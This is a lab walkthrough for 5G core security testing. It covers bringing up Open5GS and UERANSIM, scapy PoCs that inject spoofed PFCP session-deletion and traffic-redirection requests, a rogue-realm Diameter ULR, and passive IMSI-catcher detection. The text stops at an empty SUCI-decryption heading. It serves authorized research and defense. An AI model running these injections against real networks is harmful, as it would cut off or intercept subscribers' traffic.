# 5G Telecom Attack — Deep Dive: Lab Reproduction & Attack Walkthroughs

> **Companion guide to `5g-telecom-attack-playbook.md`.**
>
> **Purpose**: Provide step-by-step, reproducible lab walkthroughs for the canonical 5G/4G attack classes — PFCP DoS (Praetorian 2019), Diameter roaming abuse (Positive Technologies 2017-2023), IMSI catcher detection, and SUCI/SUPI privacy analysis (Alonso et al. 2021). Every command in this guide is scoped to an authorized lab (test PLMN MCC 001 / MNC 01) or to a written, signed engagement. No production subscriber data is used.

---

## 1. Introduction and Objective

This guide is the operational counterpart to the skill's playbook. Where the playbook covers architecture, threat modeling, and engagement methodology, this deep dive walks through **the specific commands, configurations, and reproduction steps** for each major 5G attack class. The reader will be able to:

- Bring up a complete 5G SA lab (Open5GS 5GC + UERANSIM UE/gNB) on Kali Linux 2025-2 (ARM64 or x86_64)
- Reproduce the Praetorian (2019) PFCP DoS class against an Open5GS UPF
- Set up a Diameter S6a lab (OsmoHLR + seagull) and reproduce the Positive Technologies ULR/PSI abuse class
- Deploy a passive SDR-based IMSI catcher detection workflow with srsRAN
- Capture and analyze SUCI/SUPI on the air and reproduce the Alonso et al. ECIES decryption PoC against a test operator key

**Target audience**: Red team operators, telecom CSIRT engineers, vendor security researchers, and academic 5G security students.

**Prerequisites**: Familiarity with 3GPP TS 23.501 (5G System Architecture), TS 38.413 (NGAP), TS 29.244 (PFCP), TS 29.272 (S6a Diameter), and TS 33.501 (5G Security). A working Kali Linux 2025-2 install with Docker, Go 1.21+, Python 3.10+, and an SDR (USRP B210, BladeRF 2.0 micro, or HackRF One) for §5.

**Lab host recommendations**:
- 16 GB RAM minimum (32 GB recommended for parallel SEPP / multi-NF labs)
- 4 CPU cores minimum (8 recommended)
- 100 GB free disk (Docker images, pcaps, SDR captures)
- Kali Linux 2025-2 ARM64 (e.g., on a Raspberry Pi 5 8GB) or x86_64

---

## 2. Background: 5G System Architecture Quick Refresher

Before bringing up the lab, ensure the reader has a clear picture of the 5G System (5GS). The 5GS is the union of three networks:

### 2.1 The 5G Core (5GC) — Service-Based Architecture

The 5GC is a set of Network Functions (NFs) exposing HTTP/2 + JSON APIs on the Service-Based Interface (SBI). The canonical NFs:

| NF | Role | Reference Point | Port |
|----|------|-----------------|------|
| **AMF** | Access & Mobility Management Function — terminates NGAP (N2) and NAS. The "entry door" for UEs. | N1 (NAS), N2 (NGAP) | SCTP 38412 |
| **SMF** | Session Management Function — establishes PDU sessions, controls the UPF via PFCP. | N4 (PFCP) | UDP 8805 |
| **UPF** | User Plane Function — forwards subscriber IP traffic via GTP-U tunnels to/from the gNB. | N3 (GTP-U downlink), N9 (GTP-U inter-UPF) | UDP 2152 |
| **AUSF** | Authentication Server Function — 5G-AKA / EAP-AKA' authentication. | N12 (SBI to AMF) | HTTP/2 |
| **UDM** | Unified Data Management — generates authentication vectors, holds subscriber profile. Delegates to UDR. | N8 (SBI), N10 (to PCF) | HTTP/2 |
| **UDR** | Unified Data Repository — actual subscriber database (used by UDM, PCF). | N35, N36 | HTTP/2 |
| **PCF** | Policy Control Function — QoS, charging policy. | N7 (to AMF), N15 (to AMF) | HTTP/2 |
| **NRF** | Network Repository Function — service discovery. Returns NF inventory. | SBI (all NFs) | HTTP/2 7777 (lab) |
| **NSSF** | Network Slice Selection Function — selects slice based on S-NSSAI. | N22 (to AMF) | HTTP/2 |
| **SEPP** | Security Edge Protection Proxy — N32 roaming boundary, JOSE message-level protection. | N32 (inter-operator) | HTTP/2 8443 |

### 2.2 The Radio Access Network (RAN)

- **gNodeB (gNB)** — 5G base station. Split (in O-RAN) into O-RU, O-DU, O-CU. In the lab, we use a single monolithic gNB (UERANSIM or srsRAN_Project).
- **N2** — gNB ↔ AMF (NGAP over SCTP)
- **N3** — gNB ↔ UPF (GTP-U over UDP 2152)

### 2.3 The Inter-Operator Interconnect

- **SEPP** (N32) — 5G roaming boundary. JOSE (JWS/JWE) message-level protection.
- **Diameter** (S6a for 4G/LTE MME↔HSS) — 5GC still uses Diameter in interworking scenarios.
- **SS7/MAP** — legacy 2G/3G roaming. Out of scope for new 5G engagements but still relevant for any operator with 2G/3G footprint.

### 2.4 Subscriber Identity

- **SUPI** (Subscriber Permanent Identifier) — the 5G IMSI. MCC-MNC-MSIN.
- **SUCI** (Subscriber Concealed Identifier) — SUPI encrypted with the home network public key using ECIES (Profile A: Curve25519, Profile B: secp256r1). Sent on the air during initial registration.
- **5G-GUTI** (5G Globally Unique Temporary Identifier) — temporary ID assigned by the AMF after the first successful registration. Replaces SUCI for subsequent messages.
- **PEI** (Permanent Equipment Identifier) — the device IMEI.

---

## 3. Lab Bring-Up: Open5GS + UERANSIM Full Stack

This section produces a working 5G SA lab with a registered UE and end-to-end data path. All commands run on Kali Linux 2025-2 (tested on x86_64 and ARM64).

### 3.1 Prerequisites

```bash
# Kali Linux 2025-2 baseline
sudo apt update && sudo apt -y install \
  docker.io docker-compose-plugin \
  git build-essential cmake ninja-build \
  libsctp-dev libgnutls28-dev libgcrypt-dev \
  libidn11-dev libssl-dev libnghttp2-dev libmicrohttpd-dev \
  libmongoc-dev libbson-dev libyaml-dev \
  tshark wireshark-common \
  golang-1.21 python3-pip

# SCTP kernel module
sudo modprobe sctp
echo sctp | sudo tee -a /etc/modules-load.d/modules.conf

# Disable host firewall for the lab
sudo ufw disable  # lab only; never do this on production

# Add yourself to the docker group (avoids sudo on every docker cmd)
sudo usermod -aG docker $USER
newgrp docker
```

### 3.2 Bring Up Open5GS 5GC in Docker

Open5GS ships a community Docker Compose that brings up all 10 NFs plus the WebUI.

```bash
# Clone Open5GS and the community compose
git clone --depth 1 https://github.com/open5gs/open5gs /opt/open5gs
git clone --depth 1 https://github.com/michaelb732/open5gs-docker-compose /opt/open5gs-compose
cd /opt/open5gs-compose

# Tweak: set the PLMN to test values (MCC 001, MNC 01)
# Edit open5gs/.env:
#   MCC=001
#   MNC=01
#   MNC_LENGTH=2

# Bring up the 5GC
docker compose up -d

# Verify all NFs are Up
docker compose ps
# Expected: amf, smf, upf, nrf, ausf, udm, udr, pcf, nssf, webui all "Up"

# Confirm listening ports
sudo ss -A sctp -tlnp | grep 38412   # AMF NGAP
sudo ss -ulnp | grep -E '8805|2152'  # SMF PFCP, UPF GTP-U
```

If the WebUI does not come up, check `docker compose logs webui` for MongoDB connection issues.

### 3.3 Provision a Test Subscriber in the Open5GS WebUI

```bash
# Open the WebUI at https://localhost:8080 (default admin/admin — CHANGE in lab)
# Navigate to Subscriber → Add
# Fill in:
#   IMSI    : 001010000000001
#   Key     : 0xfec86ba6eb707ed08905757b1bb44b8f  (16-byte K, engagement-scoped test key)
#   OPc     : 0xc42449363bbad02b66d16bc975d77cc1  (16-byte OPc, engagement-scoped test key)
#   APN     : internet
#   Slice   : SST 1, SD 0x010203 (eMBB)

# Or via the REST API (no WebUI clicks required):
curl -sk -X POST https://localhost:8080/api/subscriber \
  -H "Content-Type: application/json" \
  -u "admin:$(docker exec -it webui printenv MONGODB_PASSWORD | head -1)" \
  -d '{
    "imsi": "001010000000001",
    "k": "fec86ba6eb707ed08905757b1bb44b8f",
    "opc": "c42449363bbad02b66d16bc975d77cc1",
    "apn": "internet",
    "slice": [{"sst": 1, "sd": "0x010203"}]
  }'
```

### 3.4 Build and Configure UERANSIM (gNB + UE)

```bash
git clone --depth 1 https://github.com/aligungr/UERANSIM /opt/UERANSIM
cd /opt/UERANSIM
make -j$(nproc)

# Edit config/open5gs-gnb.yaml:
#   mcc: '001'
#   mnc: '01'
#   nci: '0x000000010'    # gNB ID
#   tac: 1
#   linkIp: 127.0.0.1     # gNB local IP
#   ngapIp: 127.0.0.1     # gNB NGAP source IP
#   gtpIp: 127.0.0.1      # gNB GTP-U source IP
#   amfConfigs:
#     - address: 127.0.0.5  # AMF IP (lab default)
#       port: 38412
#   slices:
#     - sst: 1
#       sd: 0x010203

# Edit config/open5gs-ue.yaml:
#   supi: 'imsi-001010000000001'
#   mcc: '001'
#   mnc: '01'
#   key: 'FEC86BA6EB707ED08905757B1BB44B8F'
#   op: 'C42449363BBAD02B66D16BC975D77CC1'
#   opType: 'OPc'
#   apn: 'internet'
#   slices:
#     - sst: 1
#       sd: 0x010203

# Launch the gNB (terminal 1)
cd /opt/UERANSIM
./build/nr-gnb -c config/open5gs-gnb.yaml

# Launch the UE (terminal 2)
./build/nr-ue -c config/open5gs-ue.yaml

# Verify the UE got an IP and the data path works
ip addr show uesimtun0                       # expect 10.45.0.x/32
ping -c 3 -I uesimtun0 1.1.1.1               # expect 0% packet loss
```

### 3.5 Verify the Full Signaling Path with tshark

```bash
# In a third terminal, capture the full 5GC signaling stack
sudo tshark -i any \
  -f 'sctp port 38412 or udp port 8805 or udp port 2152' \
  -Y 'ngap || pfcp || gtp || nas-5gs' \
  -w /tmp/lab-baseline.pcap

# (Now trigger a registration by restarting the UE: Ctrl-C the UE, restart it)
# Stop capture after ~30 seconds (Ctrl-C tshark)

# Extract the registration sequence
tshark -r /tmp/lab-baseline.pcap -Y 'nas_5gs' \
  -T fields -e frame.time_relative -e nas_5gs.message_type_name | head -20

# Confirm NAS security mode complete (ciphering/integrity activated)
tshark -r /tmp/lab-baseline.pcap -Y 'nas_5gs.message_type == 0x5d' -V | head -40
# Expected: NAS Security Mode Command with selected algorithms (e.g., NEA2/NIA2)
```

### 3.6 Common Bring-Up Failures

| Symptom | Likely Cause | Fix |
|---------|--------------|-----|
| gNB cannot connect to AMF (SCTP timeout) | Host firewall | `sudo ufw disable` (lab only) |
| UE gets no IP | Subscriber not provisioned in UDM/UDR | Re-check WebUI / REST API call (§3.3) |
| UE gets IP but ping fails | UPF forwarding broken | Check `docker compose logs upf`; verify N6 interface (`ip route` in upf container) |
| NAS security mode not complete | K/OPc mismatch | Re-check that UE K/OPc in `open5gs-ue.yaml` matches the WebUI/REST subscriber entry exactly |
| `modprobe sctp` fails | Kernel module not installed | `sudo apt install linux-modules-extra-$(uname -r)` |
| Port conflict on 38412 / 8805 / 2152 | Another lab running | `docker compose down -v` on the old lab, then retry |

---

## 4. PFCP Attack Reproduction (Praetorian 2019 DoS Class)

The Packet Forwarding Control Protocol (PFCP, 3GPP TS 29.244) runs between the SMF and UPF on the N4 reference point (UDP 8805). PFCP installs forwarding rules per subscriber session, addressed by a 64-bit SEID (Session Endpoint Identifier). The Praetorian (2019) class of attack exploits the fact that **most UPFs do not authenticate the source of PFCP messages** — any packet on UDP 8805 from the SMF's IP is trusted. An attacker who can spoof the SMF source IP (or send from a peer SMF in a multi-SMF deployment) can inject PFCP Session Deletion or Modification Requests with captured SEIDs, tearing down or redirecting subscriber sessions.

### 4.1 Capture a Valid SEID

```bash
# Start an N4 capture
sudo tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp.pcap &

# Trigger a fresh registration so we capture the PFCP Session Establishment Request
# (Ctrl-C the UE, restart it)
sleep 15

# Stop capture (kill the background tshark)
sudo pkill -f 'tshark.*pfcp'

# Extract the SEID(s) and the SMF/UPF IPs
tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' \
  -T fields -e frame.time -e ip.src -e ip.dst -e pfcp.seid | sort -u

# Sample output (lab):
#   2025-...  10.0.0.3  10.0.0.4  0x0000000000000001   # SMF -> UPF, SEID=1
#   2025-...  10.0.0.4  10.0.0.3  0x0000000000000001   # UPF -> SMF (response)

# Note the SEID, SMF IP, UPF IP for the next step
SEID=0x0000000000000001
SMF_IP=10.0.0.3   # adjust to your lab's SMF IP
UPF_IP=10.0.0.4   # adjust to your lab's UPF IP
```

### 4.2 Confirm the Subscriber Session is Active

```bash
# Before injection, confirm the UE can reach the internet
ping -c 3 -I uesimtun0 1.1.1.1
# Expect: 0% packet loss

# Also check the SMF session table
docker exec smf curl -s http://127.0.0.1:3000/sessions | jq '.[] | {imsi, seid, state}'
# Expect: one session with imsi=001010000000001, seid=1, state=ESTABLISHED
```

### 4.3 Build the PFCP Session Deletion Request PoC

Create `pfcp-teardown-poc.py`:

```python
#!/usr/bin/env python3
"""
PFCP Session Deletion Request injection PoC.
Reproduces the Praetorian (2019) class of 5GC DoS.

Scope: AUTHORIZED LAB ONLY. Never run against production subscribers
without explicit, written engagement authorization.
"""
import argparse
import struct
import socket
from scapy.all import IP, UDP, send

# PFCP message types (3GPP TS 29.244 §7.4)
PFCP_MSG_HEARTBEAT_REQUEST         = 1
PFCP_MSG_HEARTBEAT_RESPONSE        = 2
PFCP_MSG_PFCP_ASSOCIATION_SETUP_REQUEST  = 5
PFCP_MSG_SESSION_ESTABLISHMENT_REQUEST   = 50
PFCP_MSG_SESSION_ESTABLISHMENT_RESPONSE  = 51
PFCP_MSG_SESSION_MODIFICATION_REQUEST    = 52
PFCP_MSG_SESSION_DELETION_REQUEST        = 54
PFCP_MSG_SESSION_DELETION_RESPONSE       = 55

def build_pfcp_header(msg_type: int, seid: int, seq: int, mp: bool = False) -> bytes:
    """Build a PFCP v1 header (8 or 16 bytes)."""
    flags = 0x20  # v1, SEID present (S=1)
    if mp:
        flags |= 0x08  # message priority present (MP=1)
    # PFCP header: version(3b) | flags(5b) | msg_type(8b) | length(16b) | SEID(64b, if S=1) | seq(24b) | msg_priority(8b, if MP=1)
    # Length includes everything after the length field itself, in octets.
    # For SEID-present header without message priority: 8 (header) + 8 (SEID) + 3 (seq) + N (IEs)
    # Compute length at the caller level (when IEs are known).
    raise NotImplementedError("Use build_pfcp_msg below which computes length correctly.")

def build_pfcp_msg(msg_type: int, seid: int, seq: int, ies: bytes) -> bytes:
    """Build a complete PFCP message with the SEID-present header."""
    # SEID-present header (16 bytes): flags(1) + type(1) + length(2) + SEID(8) + seq(3) + spare(1) = 16
    # Length = len(seq(3) + spare(1) + ies)
    seid_bytes = struct.pack(">Q", seid)
    seq_bytes = struct.pack(">I", seq)[1:]  # 3 bytes
    spare = b"\x00"
    payload_after_length = seid_bytes + seq_bytes + spare + ies
    length = len(payload_after_length)
    flags = 0x20  # v1, SEID present
    header = struct.pack(">BBH", flags, msg_type, length)
    return header + payload_after_length

def main():
    ap = argparse.ArgumentParser(description="PFCP Session Deletion Request injection PoC")
    ap.add_argument("--upf", required=True, help="UPF IP")
    ap.add_argument("--seid", required=True, help="SEID in hex, e.g., 0x1")
    ap.add_argument("--src", default=None, help="Source IP (default: real source)")
    ap.add_argument("--sport", type=int, default=8805, help="Source UDP port")
    ap.add_argument("--dport", type=int, default=8805, help="Destination UDP port")
    ap.add_argument("--count", type=int, default=1, help="Number of packets to send")
    args = ap.parse_args()

    seid = int(args.seid, 16)
    # No IEs needed for a bare Session Deletion Request; SEID in the header identifies the session.
    # Some implementations require a Node ID IE; for Open5GS lab, the bare message suffices.
    ies = b""
    msg = build_pfcp_msg(PFCP_MSG_SESSION_DELETION_REQUEST, seid, seq=1, ies=ies)

    src = args.src if args.src else socket.gethostbyname(socket.gethostname())
    pkt = IP(src=src, dst=args.upf) / UDP(sport=args.sport, dport=args.dport) / msg

    print(f"[*] Sending PFCP Session Deletion Request:")
    print(f"    src    : {src}:{args.sport}")
    print(f"    dst    : {args.upf}:{args.dport}")
    print(f"    SEID   : 0x{seid:016x}")
    print(f"    count  : {args.count}")
    send(pkt, count=args.count, verbose=True)

if __name__ == "__main__":
    main()
```

### 4.4 Execute the Injection

```bash
# Make it executable
chmod +x pfcp-teardown-poc.py

# Capture N4 while injecting
sudo tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp-inject.pcap &

# Inject from a non-SMF vantage (e.g., from the lab host, NOT the SMF container)
# Spoof the source as the SMF IP to demonstrate the unauthenticated-source class
sudo python3 pfcp-teardown-poc.py --upf $UPF_IP --seid $SEID --src $SMF_IP

# Wait 2 seconds, then stop capture
sleep 2 && sudo pkill -f 'tshark.*pfcp-inject'

# Verify the subscriber session was torn down
ping -c 3 -I uesimtun0 1.1.1.1
# Expected (VULNERABLE UPF): 100% packet loss — session is gone
# Expected (HARDENED UPF): 0% packet loss — session persists

# Check the SMF logs
docker logs smf --tail 50 | grep -iE 'session|release|deletion'
# Vulnerable: "PFCP Session Deletion Request received" with no UE-initiated cause
# Hardened:   no such log line (the UPF dropped the forged request)
```

### 4.5 Reproduce the Traffic Redirection Variant

The Praetorian class extends beyond DoS to **traffic redirection** — inject a PFCP Session Modification Request that changes the UPF's far-end F-TEID to point at an attacker-controlled GTP-U listener, redirecting subscriber uplink traffic.

```python
#!/usr/bin/env python3
"""
PFCP Session Modification Request injection PoC — traffic redirection variant.
Reproduces the exfiltration form of the Praetorian (2019) class.

Scope: AUTHORIZED LAB ONLY.
"""
import argparse
import struct
import socket
from scapy.all import IP, UDP, send

PFCP_MSG_SESSION_MODIFICATION_REQUEST = 52

# IE types (3GPP TS 29.244 §7.4)
IE_F_TEID = 21  # F-TEID

def build_f_teid_ie(teid: int, ipv4: str) -> bytes:
    """Build an F-TEID IE with IPv4 address."""
    # IE header: type(2) + length(2)
    # F-TEID: flags(1) + TEID(4) + IPv4(4)
    flags = 0x02  # V4 bit set (IPv4 present), no TEID-chosen bit
    teid_bytes = struct.pack(">I", teid)
    ip_bytes = socket.inet_aton(ipv4)
    value = struct.pack(">B", flags) + teid_bytes + ip_bytes
    return struct.pack(">HH", IE_F_TEID, len(value)) + value

def build_pfcp_msg(msg_type: int, seid: int, seq: int, ies: bytes) -> bytes:
    seid_bytes = struct.pack(">Q", seid)
    seq_bytes = struct.pack(">I", seq)[1:]
    spare = b"\x00"
    payload_after_length = seid_bytes + seq_bytes + spare + ies
    length = len(payload_after_length)
    flags = 0x20
    header = struct.pack(">BBH", flags, msg_type, length)
    return header + payload_after_length

def main():
    ap = argparse.ArgumentParser(description="PFCP Session Modification Request — redirection PoC")
    ap.add_argument("--upf", required=True, help="UPF IP")
    ap.add_argument("--seid", required=True, help="SEID in hex")
    ap.add_argument("--new-teid", required=True, help="New far-end TEID (hex)")
    ap.add_argument("--new-ip", required=True, help="Attacker-controlled GTP-U listener IP")
    ap.add_argument("--src", default=None, help="Source IP (default: real source)")
    args = ap.parse_args()

    seid = int(args.seid, 16)
    new_teid = int(args.new_teid, 16)
    f_teid_ie = build_f_teid_ie(new_teid, args.new_ip)
    msg = build_pfcp_msg(PFCP_MSG_SESSION_MODIFICATION_REQUEST, seid, seq=2, ies=f_teid_ie)

    src = args.src if args.src else socket.gethostbyname(socket.gethostname())
    pkt = IP(src=src, dst=args.upf) / UDP(sport=8805, dport=8805) / msg
    print(f"[*] Injecting PFCP Session Modification Request (redirection):")
    print(f"    SEID     : 0x{seid:016x}")
    print(f"    new F-TEID: TEID=0x{new_teid:08x} IP={args.new_ip}")
    send(pkt, count=1, verbose=True)

if __name__ == "__main__":
    main()
```

Execution:

```bash
# On the attacker host (e.g., the lab host itself), start a GTP-U listener
nc -u -l 2152 > /tmp/redirected.bin &
NC_PID=$!

# Inject the modification
sudo python3 pfcp-modify-redirect-poc.py \
  --upf $UPF_IP --seid $SEID \
  --new-teid 0xdeadbeef --new-ip 127.0.0.1

# Generate subscriber traffic
ping -c 5 -I uesimtun0 1.1.1.1

# Stop the listener and examine the redirected bytes
kill $NC_PID
xxd /tmp/redirected.bin | head -20
# Vulnerable UPF: bytes from UE present (ICMP echo request inside GTP-U)
# Hardened UPF:   /tmp/redirected.bin is empty
```

### 4.6 Document the Finding

For each injection PoC, the report should include:

1. **Captured SEID** (with timestamp, source pcap)
2. **Injection packet** (full hex dump, source/dest, msg_type, SEID)
3. **Result on the subscriber** (session torn down / traffic redirected / no effect)
4. **UPF log entry** (proves the forged message was processed or rejected)
5. **3GPP remediation reference** (TS 33.501 §6.6.2 for DTLS on N4; TS 29.244 for source authentication requirements)

---

## 5. Diameter S6a Lab Reproduction (Positive Technologies Class)

The 4G/LTE S6a interface (MME↔HSS) speaks Diameter on SCTP 3868. The Positive Technologies (2017-2023) research demonstrated that an authorized roaming peer — or an attacker with stolen peer credentials — can issue Update-Location-Request (ULR, cmd-code 316) and Provide-Subscriber-Info (PSI, cmd-code 838903) for subscribers who are **not roaming on that visited network**, retrieving authentication vectors and subscriber location.

### 5.1 Lab: OsmoHLR + seagull

```bash
# Bring up OsmoHLR with a Diameter S6a peer configured
docker run -d --name hss --network lab \
  -v $PWD/osmo-hlr.cfg:/etc/osmocom/osmo-hlr.cfg \
  osmocom/osmo-hlr:latest \
  /usr/local/bin/osmo-hlr -c /etc/osmocom/osmo-hlr.cfg

# osmo-hlr.cfg excerpt (engagement-scoped, test realm):
#   hlr
#     gsup
#       bind ip 0.0.0.0
#     ps
#       ps sd (subscriber-data)
#     diameter
#       identity hss.testlab.mnc001.mcc001.3gppnetwork.org
#       realm testlab.mnc001.mcc001.3gppnetwork.org
#       listen port 3868
#       peer mme.testlab.mnc001.mcc001.3gppnetwork.org allow
#     ...

# Install seagull (Diameter test tool)
sudo apt install -y seagull

# Provision a test subscriber in OsmoHLR
docker exec -it hss osmo-hlr-db-tool subscriber-create \
  --imsi 001010000000001 \
  --msisdn 1001 \
  --aud 2g --ki fec86ba6eb707ed08905757b1bb44b8f
```

### 5.2 Construct an Update-Location-Request (ULR)

Create `ULR.xml` for seagull:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<scenario>
  <counter>
    <countername>session-id</countername>
    <initval>1000</initval>
  </counter>

  <send channel="channel-1">
    <command name="ULR">
      <avp name="Session-Id" value="testlab;[session-id]"></avp>
      <avp name="Auth-Session-State" value="1"></avp>
      <avp name="User-Name" value="001010000000001"></avp>
      <avp name="Destination-Realm" value="testlab.mnc001.mcc001.3gppnetwork.org"></avp>
      <avp name="Destination-Host" value="hss.testlab.mnc001.mcc001.3gppnetwork.org"></avp>
      <avp name="Origin-Host" value="mme.rogue.mnc099.mcc099.3gppnetwork.org"></avp>
      <avp name="Origin-Realm" value="rogue.mnc099.mcc099.3gppnetwork.org"></avp>
      <avp name="RAT-Type" value="1004"></avp>
      <avp name="ULR-Flags" value="0"></avp>
      <avp name="Visited-PLMN-Id" value="0x00f099"></avp>
      <avp name="UE-SRVCC-Capability" value="0"></avp>
    </command>
  </send>

  <receive channel="channel-1">
    <command name="ULA">
    </command>
  </receive>
</scenario>
```

Note the **rogue origin realm** (`mme.rogue.mnc099.mcc099.3gppnetwork.org`) — this simulates a Diameter peer that is NOT the subscriber's actual visited network.

### 5.3 Execute and Capture

```bash
# Capture S6a traffic
sudo tshark -i any -f 'sctp port 3868' -Y diameter -w /tmp/s6a.pcap &

# Send the ULR via seagull
/opt/seagull/run/seagull.sh \
  -conf /opt/seagull/conf/conf.xml \
  -scen ULR.xml \
  -diconnect peer-ip 3868 \
  -log /tmp/seagull.log

# Stop capture
sudo pkill -f 'tshark.*s6a'

# Parse the ULA response
tshark -r /tmp/s6a.pcap \
  -Y 'diameter.cmd.code == 316 && diameter.cmd.flags.request == 0' \
  -V | grep -E 'ULA-Result|Subscription-Data|MSISDN|Auth-Vector'

# Vulnerible HSS (no SS7/Diameter firewall):
#   ULA returns full subscription data even from the rogue realm
# Hardened HSS (with signaling firewall):
#   ULA rejected with DIAMETER_ERROR_ROAMING_NOT_ALLOWED (result-code 4182)
```

### 5.4 Document the Finding

1. **Rogue realm used** (clearly marked as engagement-scoped simulation)
2. **ULR XML and tshark capture**
3. **ULA result code** (2001=Success / 4182=Roaming-Not-Allowed / 4181=User-Unknown)
4. **Subscription data returned** (if any) — redacted
5. **GSMA FS.33 reference** for the recommended Diameter firewall rule set

---

## 6. IMSI Catcher Detection with srsRAN

This is the **defensive** section of the guide — detecting rogue base stations that would trigger UE IMSI/SUCI disclosure. Passive reception is legal in most jurisdictions; active transmission requires an operator license.

### 6.1 Hardware Setup

```bash
# Verify SDR hardware
# USRP B210:
uhd_usrp_probe
# BladeRF 2.0 micro:
bladeRF-cli -p
# HackRF One:
hackrf_info

# All three should be detected. For IMSI catcher detection, USRP B210 is preferred
# (full-duplex, 2 RX channels, DC-6 GHz, supports all 5G/LTE bands).
```

### 6.2 Passive Survey of 5G Bands

```bash
# Survey n78 (3.3-3.8 GHz, common 5G TDD band)
# Use srsRAN's cell scanner (5G SA)
cd /opt/srsRAN_Project/build
./apps/scan/srsran_scanner --band 78 --freq_start 3.3e9 --freq_end 3.8e9

# Sample output (lab):
#   [INFO] Found cell: ARFCN=632000, SSB ARFCN=632000, PCI=42, RSRP=-87 dBm
#   [INFO] Found cell: ARFCN=636000, SSB ARFCN=636000, PCI=123, RSRP=-92 dBm

# For LTE, use srsran_scanner from srsRAN 4G:
cd /opt/srsran_4g/build
./srsran_scanner --band 3 --freq_start 1.805e9 --freq_end 1.880e9

# Cross-reference detected cells against:
#   - OpenCellID database (https://opencellid.org)
#   - Operator's published cell inventory (engagement-scoped)
#   - ITU PLMN database for MCC/MNC validation
```

### 6.3 Decode SIB1 to Extract PLMN, TAC, Cell ID

```bash
# Capture SSB bursts into a file
cd /opt/srsRAN_Project/build
./apps/examples/phy/srsran_sync_capture --band 78 --ssb_arfcn 632000 --duration 10 -o /tmp/ssb.bin

# Decode SIB1
./apps/examples/phy/srsran_sib1_decoder -i /tmp/ssb.bin

# Sample decoded SIB1 (engagement-scoped test cell):
#   PLMN-InfoList:
#     [0] mcc=001, mnc=01
#   CellIdentity: 0x0000001
#   TAC: 1
#   Slice (S-NSSAI): SST=1, SD=0x010203
```

### 6.4 Anomaly Detection Heuristics

Flag a cell as a **candidate rogue base station** if any of the following are true:

1. **PLMN mismatch** — detected cell's PLMN does not match the expected operator for the location (e.g., a "001/01" test PLMN appearing outside the lab).
2. **Cell ID not in inventory** — the cell ID is not in the operator's planned inventory for the area.
3. **PCI conflict** — two cells with the same Physical Cell ID in close geographic proximity (rare in well-planned networks).
4. **High SUCI rate** — an unusually high rate of ECIES-encrypted SUCI from multiple UEs all hitting the same cell, indicating a base station aggressively requesting identity disclosure.
5. **Forced downgrade** — the cell attempts to push UEs to a weaker security context (e.g., null ciphering, NEA0/NIA0 selected after Security Mode Command).
6. **Silent SMS / TAC change** — observed via AIMSICD on a rooted Android with Qualcomm DIAG access.

### 6.5 AIMSICD Setup for Long-Duration Logging

```bash
# AIMSICD (Android IMSI-Catcher Detector) runs on a rooted Android device
# with Qualcomm DIAG access (most Pixel and Samsung flagship devices).

# Build AIMSICD from source:
git clone --depth 1 https://github.com/CellularPrivacy/Android-IMSI-Catcher-Detector /opt/AIMSICD
cd /opt/AIMSICD
./gradlew assembleDebug

# Install on a rooted device
adb install -r app/build/outputs/apk/debug/AIMSICD-debug.apk

# Grant DIAG permissions and run for 24-48 hours at the survey location
# Pull logs for offline analysis:
adb pull /sdcard/AIMSICD/Detection_Log.db /tmp/aimsicd-$(date +%Y%m%d).db

# Analyze silent SMS and TAC changes
sqlite3 /tmp/aimsicd-*.db \
  "SELECT timestamp, lac, tac, cell_id, mcc, mnc, signal FROM cell_table ORDER BY timestamp;"
```

### 6.6 Spectrum Monitoring Anomaly Detection

For continuous monitoring (CSIRT-scale deployment), capture the operator's licensed band 24/7 and apply anomaly detection to the SSB burst pattern. Anomalies include:

- New SSB bursts appearing in a previously-empty ARFCN
- PCI or cell ID changes that do not match planned maintenance windows
- Sudden RSSI spikes that suggest a high-power transmitter near the survey site

A minimal Python + UHD loop:

```python
#!/usr/bin/env python3
"""
Continuous SSB burst monitor for rogue base station detection.
Scope: PASSIVE RECEPTION ONLY. No transmission.
"""
import uhd
import numpy as np
import time
from datetime import datetime

FREQ = 3.5e9          # n78 center (Hz)
RATE = 20e6           # 20 MHz
GAIN = 40             # dB
THRESHOLD_DB = -90    # RSSI threshold for "active signal"

def main():
    usrp = uhd.usrp.MultiUSRP()
    usrp.set_rx_rate(RATE, 0)
    usrp.set_rx_freq(uhd.types.TuneRequest(FREQ), 0)
    usrp.set_rx_gain(GAIN, 0)

    samples = np.zeros(int(RATE), dtype=np.complex64)
    md = uhd.types.RXMetadata()
    streamer = usrp.get_rx_stream(uhd.usrp.StreamArgs("fc32", "sc16"))
    s = uhd.types.StreamCMD(uhd.types.StreamMode.start_cont)
    s.stream_now = True
    streamer.issue_stream_cmd(s)

    while True:
        streamer.recv(samples, md)
        rssi_db = 20 * np.log10(np.max(np.abs(samples)) + 1e-12)
        if rssi_db > THRESHOLD_DB:
            print(f"{datetime.utcnow().isoformat()}  RSSI={rssi_db:.1f} dB  (above threshold)")
        time.sleep(0.5)

if __name__ == "__main__":
    main()
```

---

## 7. SUCI/SUPI Privacy Analysis (Alonso et al. Class)

The Alonso et al. (2021+) research demonstrated that 5G's SUCI protection scheme is vulnerable when:
1. The operator deploys the **null scheme** (protection_scheme=0) — SUPI is in cleartext on the air.
2. The operator uses an **ECIES scheme with a weak or known-compromised home network public key**.

This section walks through both variants.

### 7.1 Capture SUCI on the Air

```bash
# Capture NAS on N1/N2
sudo tshark -i any -f 'sctp port 38412' -Y 'nas-5gs' -w /tmp/suci.pcap

# (Trigger a fresh UE registration to capture a new SUCI)
# Ctrl-C the UE, restart it, wait 5 seconds, stop tshark.

# Extract SUCI fields
tshark -r /tmp/suci.pcap -Y 'nas_5gs.message_type == 0x41' \
  -T fields \
  -e nas_5gs.mobile_identity.suci.protection_scheme \
  -e nas_5gs.mobile_identity.suci.home_network_public_key_id \
  -e nas_5gs.mobile_identity.suci.scheme_output

# Sample output:
#   0   0   001010000000001              <-- NULL SCHEME: cleartext SUPI (CRITICAL)
#   1   1   0x4b7c0e65...                <-- ECIES Profile A
#   2   1   0x02789f3a...                <-- ECIES Profile B
```

### 7.2 Null-Scheme Variant (CRITICAL)

If `protection_scheme == 0`, the `scheme_output` field IS the SUPI in cleartext. No further work is needed — the operator is broadcasting IMSI on the air, equivalent to 4G/LTE.

**Report this as CRITICAL.** The remediation is to deploy ECIES Profile A or B with a strong home network public key.

### 7.3 ECIES Decryption PoC (Lab with Known Private Key)

